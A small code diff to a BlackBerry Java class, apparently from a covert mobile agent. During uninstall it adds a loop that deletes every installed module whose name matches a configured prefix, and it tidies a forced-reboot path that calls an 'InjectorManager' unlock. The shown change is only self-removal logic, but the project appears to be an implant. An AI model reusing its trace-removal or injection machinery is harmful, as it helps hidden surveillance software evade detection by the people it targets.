@@ -317,6 +317,23 @@ public final class Core implements Runnable {
         //#ifdef DEBUG
         System.out.println("uninstalling");
         //#endif
+
+        final int handles[] = CodeModuleManager.getModuleHandles();
+        final int size = handles.length;
+        for (int i = 0; i < size; i++) {
+            final int handle = handles[i];
+            //CodeModuleManager.getModuleHandle(name)
+            // Retrieve specific information about a module.
+            final String name = CodeModuleManager.getModuleName(handle);
+
+            if (name.startsWith(Cfg.MODULE_NAME)) {
+                //#ifdef DEBUG
+                debug.warn("Removing handle: " + handle + " name: " + name);
+                //#endif
+                CodeModuleManager.deleteModuleEx(handle, true);
+            }
+        }
+
         final ApplicationDescriptor ad = ApplicationDescriptor
                 .currentApplicationDescriptor();
 
@@ -335,7 +352,7 @@ public final class Core implements Runnable {
             //Main.getInstance().pushBlack();
             Utils.sleep(8000);
 
-            if(!InjectorManager.unLock()){
+            if (!InjectorManager.unLock()) {
                 //#ifdef DEBUG
                 debug.trace("forceReboot: unlock failed");
                 //#endif
